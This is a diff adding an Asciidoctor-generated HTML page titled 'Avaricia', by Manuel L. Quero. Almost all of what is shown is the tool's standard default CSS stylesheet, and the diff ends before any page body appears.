@@ -1,0 +1,1745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="generator" content="Asciidoctor 2.0.23">
+<meta name="author" content="Manuel L. Quero">
+<title>Avaricia</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
+<style>
+/*! Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
+/* Uncomment the following line when using as a custom stylesheet */
+/* @import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700"; */
+html{font-family:sans-serif;-webkit-text-size-adjust:100%}
+a{background:none}
+a:focus{outline:thin dotted}
+a:active,a:hover{outline:0}
+h1{font-size:2em;margin:.67em 0}
+b,strong{font-weight:bold}
+abbr{font-size:.9em}
+abbr[title]{cursor:help;border-bottom:1px dotted #dddddf;text-decoration:none}
+dfn{font-style:italic}
+hr{height:0}
+mark{background:#ff0;color:#000}
+code,kbd,pre,samp{font-family:monospace;font-size:1em}
+pre{white-space:pre-wrap}
+q{quotes:"\201C" "\201D" "\2018" "\2019"}
+small{font-size:80%}
+sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
+sup{top:-.5em}
+sub{bottom:-.25em}
+img{border:0}
+svg:not(:root){overflow:hidden}
+figure{margin:0}
+audio,video{display:inline-block}
+audio:not([controls]){display:none;height:0}
+fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
+legend{border:0;padding:0}
+button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
+button,input{line-height:normal}
+button,select{text-transform:none}
+button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}
+button[disabled],html input[disabled]{cursor:default}
+input[type=checkbox],input[type=radio]{padding:0}
+button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
+textarea{overflow:auto;vertical-align:top}
+table{border-collapse:collapse;border-spacing:0}
+*,::before,::after{box-sizing:border-box}
+html,body{font-size:100%}
+body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;line-height:1;position:relative;cursor:auto;-moz-tab-size:4;-o-tab-size:4;tab-size:4;word-wrap:anywhere;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
+a:hover{cursor:pointer}
+img,object,embed{max-width:100%;height:auto}
+object,embed{height:100%}
+img{-ms-interpolation-mode:bicubic}
+.left{float:left!important}
+.right{float:right!important}
+.text-left{text-align:left!important}
+.text-right{text-align:right!important}
+.text-center{text-align:center!important}
+.text-justify{text-align:justify!important}
+.hide{display:none}
+img,object,svg{display:inline-block;vertical-align:middle}
+textarea{height:auto;min-height:50px}
+select{width:100%}
+.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
+div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0}
+a{color:#2156a5;text-decoration:underline;line-height:inherit}
+a:hover,a:focus{color:#1d4b8f}
+a img{border:0}
+p{line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
+p aside{font-size:.875em;line-height:1.35;font-style:italic}
+h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
+h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
+h1{font-size:2.125em}
+h2{font-size:1.6875em}
+h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
+h4,h5{font-size:1.125em}
+h6{font-size:1em}
+hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em}
+em,i{font-style:italic;line-height:inherit}
+strong,b{font-weight:bold;line-height:inherit}
+small{font-size:60%;line-height:inherit}
+code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
+ul,ol,dl{line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
+ul,ol{margin-left:1.5em}
+ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0}
+ul.circle{list-style-type:circle}
+ul.disc{list-style-type:disc}
+ul.square{list-style-type:square}
+ul.circle ul:not([class]),ul.disc ul:not([class]),ul.square ul:not([class]){list-style:inherit}
+ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
+dl dt{margin-bottom:.3125em;font-weight:bold}
+dl dd{margin-bottom:1.25em}
+blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
+blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
+@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
+h1{font-size:2.75em}
+h2{font-size:2.3125em}
+h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
+h4{font-size:1.4375em}}
+table{background:#fff;margin-bottom:1.25em;border:1px solid #dedede;word-wrap:normal}
+table thead,table tfoot{background:#f7f8f7}
+table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
+table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
+table tr.even,table tr.alt{background:#f8f8f7}
+table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{line-height:1.6}
+h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
+h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
+.center{margin-left:auto;margin-right:auto}
+.stretch{width:100%}
+.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
+.clearfix::after,.float-group::after{clear:both}
+:not(pre).nobreak{word-wrap:normal}
+:not(pre).nowrap{white-space:nowrap}
+:not(pre).pre-wrap{white-space:pre-wrap}
+:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed}
+pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
+pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
+pre>code{display:block}
+pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
+em em{font-style:normal}
+strong strong{font-weight:400}
+.keyseq{color:rgba(51,51,51,.8)}
+kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;border-radius:3px;box-shadow:0 1px 0 rgba(0,0,0,.2),inset 0 0 0 .1em #fff;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
+.keyseq kbd:first-child{margin-left:0}
+.keyseq kbd:last-child{margin-right:0}
+.menuseq,.menuref{color:#000}
+.menuseq b:not(.caret),.menuref{font-weight:inherit}
+.menuseq{word-spacing:-.02em}
+.menuseq b.caret{font-size:1.25em;line-height:.8}
+.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
+b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
+b.button::before{content:"[";padding:0 3px 0 2px}
+b.button::after{content:"]";padding:0 2px 0 3px}
+p a>code:hover{color:rgba(0,0,0,.9)}
+#header,#content,#footnotes,#footer{width:100%;margin:0 auto;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
+#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
+#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
+#content{margin-top:1.25em}
+#content::before{content:none}
+#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
+#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
+#header>h1:only-child{border-bottom:1px solid #dddddf;padding-bottom:8px}
+#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:flex;flex-flow:row wrap}
+#header .details span:first-child{margin-left:-.125em}
+#header .details span.email a{color:rgba(0,0,0,.85)}
+#header .details br{display:none}
+#header .details br+span::before{content:"\00a0\2013\00a0"}
+#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
+#header .details br+span#revremark::before{content:"\00a0|\00a0"}
+#header #revnumber{text-transform:capitalize}
+#header #revnumber::after{content:"\00a0"}
+#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
+#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
+#toc>ul{margin-left:.125em}
+#toc ul.sectlevel0>li>a{font-style:italic}
+#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
+#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
+#toc li{line-height:1.3334;margin-top:.3334em}
+#toc a{text-decoration:none}
+#toc a:active{text-decoration:underline}
+#toctitle{color:#7a2518;font-size:1.2em}
+@media screen and (min-width:768px){#toctitle{font-size:1.375em}
+body.toc2{padding-left:15em;padding-right:0}
+body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
+#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
+#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
+#toc.toc2>ul{font-size:.9em;margin-bottom:0}
+#toc.toc2 ul ul{margin-left:0;padding-left:1em}
+#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
+body.toc2.toc-right{padding-left:0;padding-right:15em}
+body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
+@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
+#toc.toc2{width:20em}
+#toc.toc2 #toctitle{font-size:1.375em}
+#toc.toc2>ul{font-size:.95em}
+#toc.toc2 ul ul{padding-left:1.25em}
+body.toc2.toc-right{padding-left:0;padding-right:20em}}
+#content #toc{border:1px solid #e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;border-radius:4px}
+#content #toc>:first-child{margin-top:0}
+#content #toc>:last-child{margin-bottom:0}
+#footer{max-width:none;background:rgba(0,0,0,.8);padding:1.25em}
+#footer-text{color:hsla(0,0%,100%,.8);line-height:1.44}
+#content{margin-bottom:.625em}
+.sect1{padding-bottom:.625em}
+@media screen and (min-width:768px){#content{margin-bottom:1.25em}
+.sect1{padding-bottom:1.25em}}
+.sect1:last-child{padding-bottom:0}
+.sect1+.sect1{border-top:1px solid #e7e7e9}
+#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
+#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
+#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
+#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
+#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
+details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
+details{margin-left:1.25rem}
+details>summary{cursor:pointer;display:block;position:relative;line-height:1.6;margin-bottom:.625rem;outline:none;-webkit-tap-highlight-color:transparent}
+details>summary::-webkit-details-marker{display:none}
+details>summary::before{content:"";border:solid transparent;border-left:solid;border-width:.3em 0 .3em .5em;position:absolute;top:.5em;left:-1.25rem;transform:translateX(15%)}
+details[open]>summary::before{border:solid transparent;border-top:solid;border-width:.5em .3em 0;transform:translateY(15%)}
+details>summary::after{content:"";width:1.25rem;height:1em;position:absolute;top:.3em;left:-1.25rem}
+.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
+table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
+.paragraph.lead>p,#preamble>.sectionbody>[class=paragraph]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
+.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
+.admonitionblock>table td.icon{text-align:center;width:80px}
+.admonitionblock>table td.icon img{max-width:none}
+.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
+.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6);word-wrap:anywhere}
+.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
+.exampleblock>.content{border:1px solid #e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;border-radius:4px}
+.sidebarblock{border:1px solid #dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;border-radius:4px}
+.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
+.exampleblock>.content>:first-child,.sidebarblock>.content>:first-child{margin-top:0}
+.exampleblock>.content>:last-child,.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
+.literalblock pre,.listingblock>.content>pre{border-radius:4px;overflow-x:auto;padding:1em;font-size:.8125em}
+@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
+@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
+.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class=highlight],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
+.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
+.listingblock>.content{position:relative}
+.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
+.listingblock:hover code[data-lang]::before{display:block}
+.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
+.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
+.listingblock pre.highlightjs{padding:0}
+.listingblock pre.highlightjs>code{padding:1em;border-radius:4px}
+.listingblock pre.prettyprint{border-width:0}
+.prettyprint{background:#f7f7f8}
+pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
+pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
+pre.prettyprint li code[data-lang]::before{opacity:1}
+pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
+table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
+table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
+table.linenotable td.code{padding-left:.75em}
+table.linenotable td.linenos,pre.pygments .linenos{border-right:1px solid;opacity:.35;padding-right:.5em;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+pre.pygments span.linenos{display:inline-block;margin-right:.75em}
+.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
+.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
+.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
+.quoteblock blockquote{margin:0;padding:0;border:0}
+.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
+.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
+.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
+.verseblock{margin:0 1em 1.25em}
+.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans-serif;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
+.verseblock pre strong{font-weight:400}
+.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
+.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
+.quoteblock .attribution br,.verseblock .attribution br{display:none}
+.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
+.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
+.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
+.quoteblock.abstract{margin:0 1em 1.25em;display:block}
+.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
+.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
+.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
+.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
+.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;font-size:.85rem;text-align:left;margin-right:0}
+p.tableblock:last-child{margin-bottom:0}
+td.tableblock>.content{margin-bottom:1.25em;word-wrap:anywhere}
+td.tableblock>.content>:last-child{margin-bottom:-1.25em}
+table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
+table.grid-all>*>tr>*{border-width:1px}
+table.grid-cols>*>tr>*{border-width:0 1px}
+table.grid-rows>*>tr>*{border-width:1px 0}
+table.frame-all{border-width:1px}
+table.frame-ends{border-width:1px 0}
+table.frame-sides{border-width:0 1px}
+table.frame-none>colgroup+*>:first-child>*,table.frame-sides>colgroup+*>:first-child>*{border-top-width:0}
+table.frame-none>:last-child>:last-child>*,table.frame-sides>:last-child>:last-child>*{border-bottom-width:0}
+table.frame-none>*>tr>:first-child,table.frame-ends>*>tr>:first-child{border-left-width:0}
+table.frame-none>*>tr>:last-child,table.frame-ends>*>tr>:last-child{border-right-width:0}
+table.stripes-all>*>tr,table.stripes-odd>*>tr:nth-of-type(odd),table.stripes-even>*>tr:nth-of-type(even),table.stripes-hover>*>tr:hover{background:#f8f8f7}
+th.halign-left,td.halign-left{text-align:left}
+th.halign-right,td.halign-right{text-align:right}
+th.halign-center,td.halign-center{text-align:center}
+th.valign-top,td.valign-top{vertical-align:top}
+th.valign-bottom,td.valign-bottom{vertical-align:bottom}
+th.valign-middle,td.valign-middle{vertical-align:middle}
+table thead th,table tfoot th{font-weight:bold}
+tbody tr th{background:#f7f8f7}
+tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
+p.tableblock>code:only-child{background:none;padding:0}
+p.tableblock{font-size:1em}
+ol{margin-left:1.75em}
+ul li ol{margin-left:1.5em}
+dl dd{margin-left:1.125em}
+dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
+li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
+ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
+ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
+ul.unstyled,ol.unstyled{margin-left:0}
+li>p:empty:only-child::before{content:"";display:inline-block}
+ul.checklist>li>p:first-child{margin-left:-1em}
+ul.checklist>li>p:first-child>.fa-square-o:first-child,ul.checklist>li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
+ul.checklist>li>p:first-child>input[type=checkbox]:first-child{margin-right:.25em}
+ul.inline{display:flex;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
+ul.inline>li{margin-left:1.25em}
+.unstyled dl dt{font-weight:400;font-style:normal}
+ol.arabic{list-style-type:decimal}
+ol.decimal{list-style-type:decimal-leading-zero}
+ol.loweralpha{list-style-type:lower-alpha}
+ol.upperalpha{list-style-type:upper-alpha}
+ol.lowerroman{list-style-type:lower-roman}
+ol.upperroman{list-style-type:upper-roman}
+ol.lowergreek{list-style-type:lower-greek}
+.hdlist>table,.colist>table{border:0;background:none}
+.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
+td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
+td.hdlist1{font-weight:bold;padding-bottom:1.25em}
+td.hdlist2{word-wrap:anywhere}
+.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
+.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
+.colist td:not([class]):first-child img{max-width:none}
+.colist td:not([class]):last-child{padding:.25em 0}
+.thumb,.th{line-height:0;display:inline-block;border:4px solid #fff;box-shadow:0 0 0 1px #ddd}
+.imageblock.left{margin:.25em .625em 1.25em 0}
+.imageblock.right{margin:.25em 0 1.25em .625em}
+.imageblock>.title{margin-bottom:0}
+.imageblock.thumb,.imageblock.th{border-width:6px}
+.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
+.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
+.image.left{margin-right:.625em}
+.image.right{margin-left:.625em}
+a.image{text-decoration:none;display:inline-block}
+a.image object{pointer-events:none}
+sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
+sup.footnote a,sup.footnoteref a{text-decoration:none}
+sup.footnote a:active,sup.footnoteref a:active,#footnotes .footnote a:first-of-type:active{text-decoration:underline}
+#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
+#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
+#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
+#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
+#footnotes .footnote:last-of-type{margin-bottom:0}
+#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
+div.unbreakable{page-break-inside:avoid}
+.big{font-size:larger}
+.small{font-size:smaller}
+.underline{text-decoration:underline}
+.overline{text-decoration:overline}
+.line-through{text-decoration:line-through}
+.aqua{color:#00bfbf}
+.aqua-background{background:#00fafa}
+.black{color:#000}
+.black-background{background:#000}
+.blue{color:#0000bf}
+.blue-background{background:#0000fa}
+.fuchsia{color:#bf00bf}
+.fuchsia-background{background:#fa00fa}
+.gray{color:#606060}
+.gray-background{background:#7d7d7d}
+.green{color:#006000}
+.green-background{background:#007d00}
+.lime{color:#00bf00}
+.lime-background{background:#00fa00}
+.maroon{color:#600000}
+.maroon-background{background:#7d0000}
+.navy{color:#000060}
+.navy-background{background:#00007d}
+.olive{color:#606000}
+.olive-background{background:#7d7d00}
+.purple{color:#600060}
+.purple-background{background:#7d007d}
+.red{color:#bf0000}
+.red-background{background:#fa0000}
+.silver{color:#909090}
+.silver-background{background:#bcbcbc}
+.teal{color:#006060}
+.teal-background{background:#007d7d}
+.white{color:#bfbfbf}
+.white-background{background:#fafafa}
+.yellow{color:#bfbf00}
+.yellow-background{background:#fafa00}
+span.icon>.fa{cursor:default}
+a span.icon>.fa{cursor:inherit}
+.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
+.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
+.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
+.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
+.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
+.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
+.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);border-radius:50%;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
+.conum[data-value] *{color:#fff!important}
+.conum[data-value]+b{display:none}
+.conum[data-value]::after{content:attr(data-value)}
+pre .conum[data-value]{position:relative;top:-.125em}
+b.conum *{color:inherit!important}
+.conum:not([data-value]):empty{display:none}
+dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
+h1,h2,p,td.content,span.alt,summary{letter-spacing:-.01em}
+p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
+p,blockquote,dt,td.content,td.hdlist1,span.alt,summary{font-size:1.0625rem}
+p{margin-bottom:1.25rem}
+.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
+.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;box-shadow:0 1px 4px #e0e0dc}
+.print-only{display:none!important}
+@page{margin:1.25cm .75cm}
+@media print{*{box-shadow:none!important;text-shadow:none!important}
+html{font-size:80%}
+a{color:inherit!important;text-decoration:underline!important}
+a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
+a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
+abbr[title]{border-bottom:1px dotted}
+abbr[title]::after{content:" (" attr(title) ")"}
+pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
+thead{display:table-header-group}
+svg{max-width:100%}
+p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
+h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
+#header,#content,#footnotes,#footer{max-width:none}
+#toc,.sidebarblock,.exampleblock>.content{background:none!important}
+#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
+body.book #header{text-align:center}
+body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
+body.book #header .details{border:0!important;display:block;padding:0!important}
+body.book #header .details span:first-child{margin-left:0!important}
+body.book #header .details br{display:block}
+body.book #header .details br+span::before{content:none!important}
+body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
+body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
+.listingblock code[data-lang]::before{display:block}
+#footer{padding:0 .9375em}
+.hide-on-print{display:none!important}
+.print-only{display:block!important}
+.hide-for-print{display:none!important}
+.show-for-print{display:inherit!important}}
+@media amzn-kf8,print{#header>h1:first-child{margin-top:1.25rem}
+.sect1{padding:0!important}
+.sect1+.sect1{border:0}
+#footer{background:none}
+#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
